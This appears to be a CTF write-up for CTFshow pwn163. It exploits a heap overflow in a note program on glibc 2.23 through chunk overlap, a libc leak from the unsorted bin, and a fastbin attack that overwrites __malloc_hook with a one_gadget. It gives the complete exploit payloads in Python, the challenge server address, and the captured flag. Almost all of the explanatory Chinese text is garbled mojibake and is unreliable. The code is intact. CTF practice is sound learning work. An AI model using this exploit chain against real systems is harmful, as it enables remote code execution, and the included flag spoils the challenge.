---
title: CTFshow pwn163 Heap Overlap WP
published: 2026-04-16
updated: 2026-04-17
description: 利用 edit 越界制造 chunk overlap，先从 unsorted bin 泄露 libc，再做 fastbin attack。
tags: [CTFshow, Pwn, Heap, Unsorted Bin, Fastbin]
category: ctfshow
draft: false
---
# pwn163 WP

## 棰樼洰淇℃伅

- 棰樼洰锛歚CTFshow easy heap`
- 杩滅▼锛歚nc pwn.challenge.ctf.show 28175`
- 杩滅▼鐜锛歚Ubuntu 16.04`
- 浣跨敤 libc锛歚../libcs/ubuntu16/64bit/libc-2.23.so`
- flag锛歚ctfshow{1b441545-57d3-450a-8c8e-45e872eb2287}`

## 闄勪欢涓嬭浇

- [涓嬭浇棰樼洰闄勪欢 `pwn`](../../attachments/ctfshow/pwn163/pwn)
- [涓嬭浇鍒╃敤鑴氭湰 `exp.py`](../../attachments/ctfshow/pwn163/exp.py)
- [涓嬭浇瀵瑰簲 libc `libc-2.23.so`](../../attachments/ctfshow/ubuntu16/64bit/libc-2.23.so)

## 淇濇姢涓庢€讳綋缁撹

浠庝簩杩涘埗鍙嶆眹缂栧彲浠ョ湅鍑猴細

- `Full RELRO`
- `Canary`
- `NX`
- `No PIE`

杩欐剰鍛崇潃锛?
- 涓嶈兘鐩存帴鏀?GOT
- 涓嶈兘鐩存帴鏍堜笂鎵ц shellcode
- 绋嬪簭鍩哄潃鍥哄畾锛屼絾 libc 浠嶇劧闇€瑕佹硠闇?
杩欓鐨勬牳蹇冩紡娲炲彧鏈変竴涓細`edit` 瀛樺湪鍫嗘孩鍑恒€?
## 绋嬪簭閫昏緫

绋嬪簭鏈?16 涓Ы浣嶏紝姣忎釜妲戒綅缁撴瀯鍙互鐞嗚В鎴愶細

```c
struct note {
    int used;
    size_t size;
    void *ptr;
};
```

鑿滃崟鏈夊洓涓牳蹇冩搷浣滐細

- `create`
- `edit`
- `free`
- `show`

### create

`create` 鐨勯€昏緫姣旇緝瑙勬暣锛?
- 鎵惧埌绗竴涓┖妲?- 璇诲叆鐢宠澶у皬
- 闄愬埗鏈€澶у€煎埌 `0x1000`
- `calloc(size, 1)`
- 璁板綍 `used/size/ptr`

杩欎竴娈垫湰韬病鏈夋槑鏄炬紡娲炪€?
### free

`free` 鐨勯€昏緫涔熸瘮杈冨共鍑€锛?
- 鏍￠獙 index
- 鏍￠獙 `used == 1`
- 鍏堟妸 `used` 娓?0
- 鍐嶆妸 `size` 娓?0
- `free(ptr)`
- 鏈€鍚庢妸 `ptr` 娓?0

鎵€浠ヨ繖棰樹笉鏄細

- `UAF`
- `double free`
- `show after free`

鑷冲皯绋嬪簭琛ㄥ眰閫昏緫涓嶆槸闈犺繖浜涚偣銆?
### show

`show` 浼氭寜淇濆瓨鐨?`size` 杈撳嚭鏁村潡鍐呭锛?
```c
write(1, note[idx].ptr, note[idx].size);
```

杩欎釜鍑芥暟鏈韩涔熶笉鍗遍櫓锛屽嵄闄╂潵鑷簬锛氬鏋滄垜浠兘璁?`ptr` 鎸囧悜鐨勫尯鍩熶笌 free chunk 閲嶅彔锛岄偅涔?`show` 灏辫兘鎶?free chunk 閲岀殑閾捐〃鎸囬拡鎵撳嵃鍑烘潵銆?
### edit

鐪熸鐨勬礊鍦ㄨ繖閲屻€?
閫昏緫鍙繕鍘熸垚锛?
```c
void edit(note *table) {
    int idx = read_int();
    if (idx < 0 || idx > 15) return;
    if (table[idx].used != 1) return;

    printf("Size: ");
    int n = read_int();
    if (n <= 0) return;

    printf("Content: ");
    read_n(table[idx].ptr, n);
}
```

鍏抽敭闂鏄細

- `n` 瀹屽叏鐢辩敤鎴锋帶鍒?- 绋嬪簭娌℃湁妫€鏌?`n <= table[idx].size`

鎵€浠ュ彲浠ュ褰撳墠 chunk 鍚戝悗婧㈠嚭锛岃鐩栫浉閭?chunk 鐨勫ご閮ㄣ€?
## 鍒╃敤鎬濊矾鎬昏

鏁翠綋鎬濊矾鍒嗕袱娈碉細

1. 鍏堝仛 `chunk overlap`锛屽啀浠?`unsorted bin` 娉勯湶 libc
2. 鍐嶅埄鐢ㄩ噸鍙犲潡鍘荤鏀?`fastbin fd`锛屾妸 `0x70 fastbin` 鎵撳埌 `__malloc_hook - 0x23`

鏈€鍚庨€氳繃瑕嗙洊 `__malloc_hook` 涓?`one_gadget`锛屽啀瑙﹀彂涓€娆?`malloc` 鎷?shell銆?
杩欓鏄吀鍨嬬殑锛?
- 鍏堟硠闇?libc
- 鍐?fastbin attack
- 鏈€缁堟墦 `__malloc_hook`

鐢变簬杩滅▼鏄?`Ubuntu 16.04 + glibc 2.23`锛屾病鏈?tcache锛屾墍浠ヨ繖涓墦娉曟濂芥垚绔嬨€?
## 鍒濆鍫嗗竷灞€

鑴氭湰鍓嶅洓娆＄敵璇凤細

```python
add(io, 0x40)  # 0
add(io, 0x40)  # 1
add(io, 0x40)  # 2
add(io, 0x60)  # 3
```

鍦?glibc 2.23 涓嬶紝澶ц嚧甯冨眬濡備笅锛?
```text
chunk0: request 0x40 -> real size 0x50
chunk1: request 0x40 -> real size 0x50
chunk2: request 0x40 -> real size 0x50
chunk3: request 0x60 -> real size 0x70
```

鎸夊唴瀛橀『搴忓氨鏄細

```text
[ chunk0 ][ chunk1 ][ chunk2 ][ chunk3 ]
```

## 绗竴闃舵锛氬埗閫犻噸鍙犲苟娉勯湶 libc

### Step 1. 浠?chunk0 婧㈠嚭锛屼吉閫?chunk1 鐨?size

瀵瑰簲鑴氭湰锛?
```python
edit(io, 0, b"A" * 0x40 + p64(0) + p64(0xA1))
```

杩欓噷涓轰粈涔堟槸杩欎覆 payload锛?
- `chunk0` 鐢ㄦ埛鍖哄ぇ灏忔槸 `0x40`
- 鍐欐弧 `0x40` 鍚庯紝鎺ヤ笅鏉ユ濂借鐩栧埌 `chunk1` 鐨?chunk header
- chunk header 涓渶閲嶈鐨勬槸锛?  - `prev_size`
  - `size`

浜庢槸杩欐鍐欏叆鐨勫惈涔夋槸锛?
```text
chunk0 data: "A" * 0x40
chunk1.prev_size = 0
chunk1.size      = 0xA1
```

杩欓噷鎶?`chunk1.size` 鏀规垚 `0xA1` 鐨勭洰鐨勶紝鏄 glibc 璁や负锛?
- `chunk1` 鏄竴涓湡瀹炲ぇ灏忎负 `0xA0` 鐨?chunk
- 杩欎釜澶у皬浼氳鐩栧師鏈殑 `chunk1 + chunk2`

涔熷氨鏄锛屾垜浠汉涓烘妸涓€涓師鏈彧鏈?`0x50` 鐨?chunk1锛屼吉閫犳垚浜嗕竴涓鐩栨洿澶ц寖鍥寸殑澶?chunk銆?
### Step 2. free(chunk1)

瀵瑰簲鑴氭湰锛?
```python
delete(io, 1)
```

鐢变簬琚吉閫犳垚浜?`0xA0` 澶у皬锛実libc 鍦?`free(chunk1)` 鏃朵細鎶婂畠褰撴垚涓€涓?`unsorted bin` chunk 澶勭悊銆?
杩欐椂鍙戠敓鐨勫叧閿晥鏋滀笉鏄€滅▼搴忚瑙?free 浜?index1鈥濓紝鑰屾槸鈥滃爢绠＄悊鍣ㄨ瑙掓妸涓€鍧楄鐩?chunk1 鍜?chunk2 鎵€鍦ㄥ尯鍩熺殑澶х┖闂插潡鎻掕繘浜?unsorted bin鈥濄€?
浜庢槸锛?
- 绋嬪簭閲?`idx 2` 浠嶇劧杩樿涓鸿嚜宸辨湁鏁?- 浣嗕粠 glibc 瑙掑害锛宍idx 2` 鎸囧悜鐨勫尯鍩熷凡缁忚惤鍦ㄤ竴涓?free chunk 閲岄潰浜?
杩欏氨褰㈡垚浜嗛噸鍙犮€?
### Step 3. 鍐嶇敵璇蜂竴涓?0x40

瀵瑰簲鑴氭湰锛?
```python
add(io, 0x40)
```

杩欎竴姝ヤ細浠庡垰鎵嶉偅涓ぇ鐨?unsorted chunk 閲屽垏涓€鍧楀嚭鏉ヨ繑鍥炪€?
鍒囧畬涔嬪悗锛屽墿涓嬬殑鍚庡崐閮ㄥ垎浠嶇劧鏄?free chunk銆?
鏈€鍏抽敭鐨勬槸锛?
- 鏂扮敵璇峰嚭鏉ョ殑鍧楀崰鐢ㄤ簡鍘熸潵澶?free chunk 鐨勫墠鍗婇儴鍒?- `chunk2` 鍘熸潵鐨勬寚閽堜粛鐒惰惤鍦ㄨ繖鍧楀ぇ free chunk 鐨勫悗鍗婇儴鍒嗗唴閮?
浜庢槸 `idx 2` 瀹為檯涓婂氨鎴愪簡涓€涓€滄寚鍚?free chunk 鍐呴儴鈥濈殑鎮寕鏈夋晥鎸囬拡銆?
绋嬪簭鑷繁涓嶇煡閬撹繖涓€鐐癸紝鍥犱负瀹冨彧鐪?`used == 1`銆?
### Step 4. show(chunk2) 娉勯湶 unsorted bin 鎸囬拡

瀵瑰簲鑴氭湰锛?
```python
show(io, 2)
leak = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
```

涓轰粈涔堣繖閲岃兘娉勯湶 libc锛?
- glibc 2.23 涓紝unsorted bin free chunk 鐨勭敤鎴峰尯寮€澶翠細鏀惧弻鍚戦摼琛ㄦ寚閽?- 杩欎簺鎸囬拡浼氭寚鍚?`main_arena`
- `main_arena` 浣嶄簬 libc 涓?
鑰屾鏃讹細

- `idx 2` 鐨?`ptr` 姝ｅソ鎸囧悜杩欎釜 free chunk 鍐呴儴
- `show(2)` 浼氭妸杩欓噷鐨勬暟鎹師鏍疯緭鍑?
鎵€浠ユ垜浠兘璇诲埌绫讳技锛?
```text
fd -> main_arena+offset
bk -> main_arena+offset
```

鑴氭湰閲岀敤鐨勬槸鏈€甯歌鐨?6 瀛楄妭璇绘硶锛屾嫾鎴?64 浣嶅湴鍧€銆?
### Step 5. 鐢辨硠闇插€煎弽鎺?libc 鍩哄潃

瀵瑰簲鑴氭湰锛?
```python
malloc_hook = leak - 0x10 - 88
libc.address = malloc_hook - libc.sym["__malloc_hook"]
```

涓轰粈涔堣繖涔堢畻锛?
- 娉勯湶鍑烘潵鐨勬槸 `main_arena` 鏌愪釜鍥哄畾鍋忕Щ浣嶇疆
- 鍦?glibc 2.23 涓父瑙佸叧绯绘槸锛?
```text
unsorted bin fd = main_arena + 88
main_arena      = __malloc_hook + 0x10
```

鎵€浠ワ細

```text
__malloc_hook = leak - 88 - 0x10
libc_base = __malloc_hook - offset(__malloc_hook)
```

鏈変簡 libc 鍩哄潃锛屽氨鑳界畻鍑猴細

- `__malloc_hook`
- `realloc`
- `one_gadget`

瀵瑰簲鑴氭湰锛?
```python
realloc = libc.sym["realloc"]
fake_chunk = libc.sym["__malloc_hook"] - 0x23
one_gadget = libc.address + 0x4526A
```

杩欓噷瑕佹敞鎰忥紝`libc.address` 璁惧ソ鍚庯紝`libc.sym[...]` 鍙栧嚭鏉ュ氨鏄繍琛屾椂鐪熷疄鍦板潃銆?
## 绗簩闃舵锛歠astbin attack 鎵撳埌 __malloc_hook

绗竴闃舵鍙槸娉勯湶 libc銆傜湡姝ｅ姭鎸佹帶鍒舵祦鍦ㄧ浜岄樁娈点€?
### Step 6. free(chunk3)

瀵瑰簲鑴氭湰锛?
```python
delete(io, 3)
```

`chunk3` 鐨勭敵璇峰ぇ灏忔槸 `0x60`锛屽搴旂湡瀹?chunk size 鏄?`0x70`銆?
鍦?glibc 2.23 涓紝瀹冧細杩涘叆 `fastbin[0x70]`銆?
姝ゆ椂 fastbin 閾捐〃澶ф鏄細

```text
fastbin[0x70] -> chunk3
```

### Step 7. 鐢ㄩ噸鍙犵殑 chunk2 绡℃敼 chunk3 鐨?fd

瀵瑰簲鑴氭湰锛?
```python
edit(io, 2, b"B" * 0x40 + p64(0) + p64(0x71) + p64(fake_chunk))
```

杩欐槸鏁撮绗簩涓牳蹇?payload銆?
涓轰粈涔?`idx 2` 鑳芥敼鍒?`chunk3`锛?
- 绗竴闃舵鍚庯紝`idx 2` 宸茬粡涓嶆槸涓€涓甯哥嫭绔?chunk
- 瀹冩寚鍚戠殑鏄竴涓笌鍚庣画 chunk 閲嶅彔鐨勫尯鍩?- 鎵€浠ヤ粠 `chunk2` 鍐欏嚭 `0x40 + 0x10 + 0x8` 杩欎簺瀛楄妭鍚庯紝灏辫兘纰板埌 `chunk3` 鐨勫ご

杩欎覆 payload 鐨勫惈涔夋槸锛?
```text
"B" * 0x40           -> 濉埌褰撳墠 chunk2 鐢ㄦ埛鍖烘湯灏?p64(0)               -> 瑕嗙洊鐩搁偦 chunk 鐨?prev_size
p64(0x71)            -> 鎶婄洰鏍?fastbin chunk 鐨?size 淇濇寔鎴愬悎娉曠殑 0x71
p64(__malloc_hook-0x23) -> 鎶?fastbin fd 鏀规垚 fake_chunk
```

杩欓噷 `0x71` 寰堥噸瑕侊細

- fastbin chunk 鐨?size 蹇呴』鐪嬭捣鏉ュ悎娉?- `0x70 | PREV_INUSE = 0x71`

鑰?`fd = __malloc_hook - 0x23` 鏄?glibc 2.23 鎵?`__malloc_hook` 鐨勭粡鍏稿啓娉曘€?
鍘熷洜鏄細

- 瀵?`malloc(0x60)`锛岃繑鍥炵粰鐢ㄦ埛鐨勬槸 chunk header 鍚庨潰鐨勭敤鎴峰尯鍦板潃
- 濡傛灉 fake chunk 鏀惧湪 `__malloc_hook - 0x23`
- 閭ｄ箞杩斿洖鐨勭敤鎴锋寚閽堝氨浼氳惤鍦?`__malloc_hook - 0x13`
- 鍐嶉€氳繃閫傚綋濉厖锛屽氨鑳芥妸鏌愪釜 8 瀛楄妭鍊肩簿纭啓鍒?`__malloc_hook`

### Step 8. 杩炵画涓ゆ malloc(0x60)

瀵瑰簲鑴氭湰锛?
```python
add(io, 0x60)
add(io, 0x60)
```

绗竴涓嬶細

- 鍙栧嚭鐪熸鐨?`chunk3`

绗簩涓嬶細

- 鐢变簬 `chunk3.fd` 宸茬粡琚敼鎴?`__malloc_hook - 0x23`
- glibc 浼氭妸杩欎釜 fake chunk 褰撴垚 fastbin 閾捐〃涓嬩竴涓妭鐐?- 杩斿洖鐨勫潡灏辫惤鍦?`__malloc_hook` 闄勮繎

杩欐椂绗簩娆＄敵璇峰嚭鏉ョ殑绱㈠紩锛屼篃灏辨槸鑴氭湰涓殑 `idx 4`锛屾湰璐ㄤ笂宸茬粡鏄竴涓€滄寚鍚?`__malloc_hook-0x13` 闄勮繎鐨勫彲鍐欐寚閽堚€濄€?
### Step 9. 瑕嗙洊 __malloc_hook

瀵瑰簲鑴氭湰锛?
```python
edit(io, 4, b"C" * (0x13 - 8) + p64(one_gadget) + p64(realloc + 8))
```

杩欓噷涓轰粈涔堟槸 `(0x13 - 8)`锛?
- 鐢宠杩斿洖鐨勭敤鎴锋寚閽堜笉鏄粠 `__malloc_hook - 0x23` 寮€濮嬶紝鑰屾槸浠?fake chunk 鐢ㄦ埛鍖哄紑濮?- 瀹為檯杩斿洖浣嶇疆鍦?`__malloc_hook - 0x13`
- 瑕佹妸鎺ヤ笅鏉ュ啓鍏ョ殑 8 瀛楄妭姝ｅソ瀵归綈鍒?`__malloc_hook`

鎵€浠ワ細

```text
padding = 0x13 - 0x8 = 0x0b
```

涔熷氨鏄厛濉?`0x0b` 瀛楄妭锛屽啀鍐?8 瀛楄妭 `one_gadget`銆?
鍚庨潰鐨?`p64(realloc + 8)` 鏄粡鍏告惌閰嶏細

- 鏌愪簺 `one_gadget` 瀵瑰瘎瀛樺櫒/鏍堢姸鎬佹湁瑕佹眰
- 鎶婂悗涓€涓綅缃竷鎴?`realloc+8`锛岄€氬父鑳借鎵ц璺緞鏇寸ǔ瀹?
鍦ㄨ繖棰橀噷锛屼娇鐢ㄧ殑 `one_gadget` 鍋忕Щ鏄細

```text
0x4526a
```

瀵瑰簲瀹為檯杩愯鏃跺湴鍧€锛?
```python
one_gadget = libc.address + 0x4526A
```

### Step 10. 鍐嶆瑙﹀彂 malloc

瀵瑰簲鑴氭湰锛?
```python
add(io, 0x10)
```

鍙鍐嶈蛋涓€娆?`malloc`锛実libc 灏变細璋冪敤锛?
```text
__malloc_hook(size, caller)
```

鑰屾垜浠凡缁忔妸 `__malloc_hook` 鏀规垚浜?`one_gadget`锛屾墍浠ョ▼搴忕洿鎺ヨ烦杩?gadget锛屾嬁鍒?shell銆?
## 鎷?flag

鎷垮埌 shell 鍚庣洿鎺ヨ鍙栵細

```sh
cat /flag
```

缁撴灉鏄細

```text
ctfshow{1b441545-57d3-450a-8c8e-45e872eb2287}
```

## exp 瀵圭収璇存槑

褰撳墠鐩綍涓嬬殑 `exp.py` 鍙互鍒嗘垚杩欏嚑娈电悊瑙ｃ€?
### 1. 鍩虹鑿滃崟灏佽

```python
def add(io, size):
def edit(io, idx, data):
def delete(io, idx):
def show(io, idx):
```

鍙槸鎶婅彍鍗曚氦浜掑寘瑁呬竴涓嬶紝娌℃湁鎶€宸с€?
### 2. overlap + leak

```python
add(io, 0x40)
add(io, 0x40)
add(io, 0x40)
add(io, 0x60)

edit(io, 0, b"A" * 0x40 + p64(0) + p64(0xA1))
delete(io, 1)
add(io, 0x40)

show(io, 2)
leak = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
```

杩欐鍙仛涓€浠朵簨锛?
- 閫氳繃浼€?chunk1 size锛屽埗閫?chunk overlap
- 鍐嶄粠閲嶅彔鍑烘潵鐨?free chunk 涓硠闇?libc

### 3. 璁＄畻鍏抽敭鍦板潃

```python
malloc_hook = leak - 0x10 - 88
libc.address = malloc_hook - libc.sym["__malloc_hook"]
realloc = libc.sym["realloc"]
fake_chunk = libc.sym["__malloc_hook"] - 0x23
one_gadget = libc.address + 0x4526A
```

杩欐鏄妸娉勯湶鍊艰浆鎴愬彲鍒╃敤鍦板潃銆?
### 4. fastbin attack

```python
delete(io, 3)
edit(io, 2, b"B" * 0x40 + p64(0) + p64(0x71) + p64(fake_chunk))
add(io, 0x60)
add(io, 0x60)
```

杩欐鐨勪綔鐢ㄦ槸锛?
- 閲婃斁涓€涓?`0x70 fastbin chunk`
- 鐢ㄩ噸鍙犲潡鎶婂畠鐨?`fd` 鏀瑰埌 `__malloc_hook - 0x23`
- 杩炵画鐢宠涓ゆ锛屾妸 malloc 杩斿洖浣嶇疆寮曞鍒?`__malloc_hook` 闄勮繎

### 5. 瑕嗙洊 hook 骞惰Е鍙?
```python
edit(io, 4, b"C" * (0x13 - 8) + p64(one_gadget) + p64(realloc + 8))
add(io, 0x10)
```

杩欐灏辨槸鏈€缁堝姭鎸佹帶鍒舵祦锛?
- `edit(4, ...)` 寰€ `__malloc_hook` 涓婂啓 gadget
- `add(0x10)` 鍐嶆瑙﹀彂 `malloc`

## 涓轰粈涔堣繖棰樿兘杩欐牱鍋?
杩欓鎴愮珛鐨勬牳蹇冨墠鎻愭湁涓変釜锛?
### 1. edit 娌℃湁闄愬埗鍐欏叆闀垮害

濡傛灉 `edit` 鎸夌湡瀹?chunk 澶у皬鎴柇锛屽氨涓嶄細鏈変换浣曞悗缁€?
### 2. 杩滅▼鏄?glibc 2.23

鍥犱负娌℃湁 tcache锛屾墍浠ワ細

- `0xa0` chunk 浼氳繘 unsorted bin
- `0x70` chunk 浼氳繘 fastbin

鏁翠釜鎵撴硶閮戒緷璧栬繖涓涓恒€?
### 3. 绋嬪簭鐨?show 浼氭寜淇濆瓨鐨?size 鍘熸牱杈撳嚭

铏界劧绋嬪簭灞傞潰娌℃湁 UAF锛屼絾 chunk overlap 璁┾€滈€昏緫浠嶇劧鏈夋晥鐨?note鈥濇寚鍚戜簡鈥済libc 宸茬粡 free 鐨?chunk 鍖哄煙鈥濓紝浠庤€屽畬鎴愪俊鎭硠闇层€?
## 杩欓瀛﹀埌浠€涔?
杩欓鏈€鍊煎緱璁颁綇鐨勪笉鏄?payload 鏈韩锛岃€屾槸鍒╃敤椤哄簭锛?
1. 鍏堟壘鍫嗘孩鍑鸿兘鏀硅皝鐨勫ご
2. 鍐嶇湅鑳藉惁浼€犳洿澶х殑 chunk锛屽仛 overlap
3. overlap 鍚庝紭鍏堟兂淇℃伅娉勯湶
4. 鏈変簡 libc 鍩哄潃鍐嶈€冭檻 fastbin attack
5. 鏈€鍚庢墦 `__malloc_hook`

鎹㈠彞璇濊锛岃繖棰樹笉鏄€滀竴涓?payload 鐩存帴绉掍簡鈥濓紝鑰屾槸锛?
- 绗竴涓孩鍑虹敤鏉ユ瀯閫犻噸鍙?- 閲嶅彔鐢ㄦ潵娉勯湶
- 娉勯湶鍚庣浜屾鍒╃敤閲嶅彔鍧楀仛 fastbin attack
- 鏈€缁堟墠鍔寔鎺у埗娴?
杩欐槸闈炲父鏍囧噯銆佷篃闈炲父鍊煎緱鍙嶅缁冪殑 `glibc 2.23 heap overflow` 鍒╃敤閾俱€?


